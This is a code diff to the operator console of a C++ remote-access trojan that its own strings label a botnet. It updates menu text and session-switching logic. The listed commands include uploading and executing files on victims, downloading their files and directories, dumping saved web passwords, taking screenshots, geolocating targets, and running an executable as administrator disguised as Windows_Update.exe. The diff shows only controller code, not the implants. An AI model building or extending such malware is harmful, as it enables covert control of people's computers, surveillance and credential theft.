@@ -5,12 +5,15 @@ void Info::list_scripts()
 	SetColor(2);
 	std::cout << "[\t\t------------ List of all scripts ------------" << std::endl;
 	SetColor(14);
-	std::cout << "#---------------------------- Usefull -----------------------------#" << std::endl;
+	std::cout << "#---------------------------- Folder action -----------------------------#" << std::endl;
 	SetColor(6);
-	std::cout << "[ upload \"filename\"\t\t\t: upload a file in the current directory" << std::endl;
-	std::cout << "[ upload_exe \"filename\"\t\t\t: upload and exe a file in the current directory" << std::endl;
-	std::cout << "[ download \"filename\"\t\t\t: download the file's target wanted" << std::endl;
-	std::cout << "[ download_dir \"filename\"\t\t: download the target directory" << std::endl;
+	std::cout << "[ pwd\t\t\t: Print the trojan emplacement" << std::endl;
+	std::cout << "[ ls\t\t\t: See all files in the current directory" << std::endl;
+	std::cout << "[ getTemp\t\t\t: Get the location of the temp directory" << std::endl;
+	std::cout << "[ upload \"filename\"\t\t\t: Upload a file in the current directory" << std::endl;
+	std::cout << "[ upload_exe \"filename\"\t\t\t: Upload and exe a file in the current directory" << std::endl;
+	std::cout << "[ download \"filename\"\t\t\t: Download the file's target wanted" << std::endl;
+	std::cout << "[ download_dir \"filename\"\t\t: Download the target directory" << std::endl;
 	SetColor(14);
 	std::cout << "#------------------------- System commands ------------------------#" << std::endl;
 	SetColor(6);
@@ -27,7 +30,7 @@ void Info::list_scripts()
 	SetColor(6);
 	std::cout << "[ geo\t\t\t\t: Give the localization of the current session" << std::endl;
 	std::cout << "[ enum_web\t\t\t: enum all web passwords on the current session" << std::endl;
-	std::cout << "[ screenshot <name>\t\t: Take a screenshot from the current target screen" << std::endl;
+	std::cout << "[ screenshot\t\t\t: Take a screenshot from the current target screen" << std::endl;
 	std::cout << "[ ask <exe> <name>\t\t: Upload and execute a given file as administrator with a custom name" << std::endl;
 	std::cout << "[ you can choose a new file_name, default is Windows_Update.exe" << std::endl;
 
@@ -42,36 +45,33 @@ void Info::print_help()
 	SetColor(6);
 	std::cout << "[ help\t\t\t: list all commands" << std::endl;
 	std::cout << "[ list_scripts\t\t: List all scripts available" << std::endl;
-	std::cout << "[ version\t\t: print the current version and changes" << std::endl;
+	std::cout << "[ version\t\t: Print the current version and changes" << std::endl;
+	std::cout << "[ getcurrentsession\t: Print the information about the current session" << std::endl;
 	std::cout << "[ getsysinfo\t\t: Give information about the current session (user ...)" << std::endl;
 	std::cout << "[ getip\t\t\t: Give the External IP address of the current session" << std::endl;
-	std::cout << "[ set_session\t\t: Switch to an another session" << std::endl;
+	std::cout << "[ set_session <nb_session>\t\t: Switch to an another session" << std::endl;
 	std::cout << "[ list\t\t\t: list all actives sessions" << std::endl;
-	std::cout << "[ pwd\t\t\t: print the trojan emplacement" << std::endl;
-	std::cout << "[ ls\t\t\t: see all files in the current directory" << std::endl;
+	std::cout << "[ exit_session <number>\t: Exit a given session" << std::endl;
 	std::cout << "[ exit\t\t\t: exit the program" << std::endl;
 	SetColor(7);
 }
 
- bool Info::set_session(Server* server)
+ bool Info::set_session(Server* server,const std::string nb_session)
 {
-	int nb;
-	server->send_b("[*] Please enter the number of the session : ");
-	std::cin >> nb;
+	int nb= atoi(nb_session.c_str());
 	std::vector<st_Client> clients = server->getClients();
-	for (int i = 0; clients.size(); i++)
+	if (nb <= clients.size())
 	{
-		if (clients[i].number == nb)
-		{
-			server->setDefaultClient(server->getClients()[i]);
-			server->send_b("[*] Done");
-			return 1;
-		}
+		std::cout << "Switching with session "+nb_session+" ..." << std::endl;
+		server->setDefaultClient(clients[nb-1]);
+		std::cout << "Done" << std::endl;
+		return 1;
 	}
-	server->send_b("[*] Can't find : ");
-	server->send_b(nb);
-	return 0;
-
+	else
+	{
+		server->send_b(("[*] Can't find : " + nb_session).c_str());
+		return 0;
+	}
 }
 
  void Info::list(Server* server)
@@ -93,8 +93,20 @@ void Info::getsysinfo(Server* server)
 	std::stringstream ss;
 
 }
-
-
+void Info::version(Server* server)
+{
+	SetColor(2);
+	std::cout << "BOTNET Version : " << VERSION << std::endl;
+	std::cout << "Last update : " << UPDATE << std::endl << std::endl;
+	SetColor(7);
+}
+void Info::getcurrentsession(Server* server)
+{
+	SetColor(14);
+	std::cout << "Current session number : " << server->getDefaultClient().number <<std::endl;
+	std::cout << "Connected with : " << server->getDefaultClient().ip_extern << std::endl;
+	SetColor(7);
+}
 void SetColor(int value)
 {
 	SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE), value);
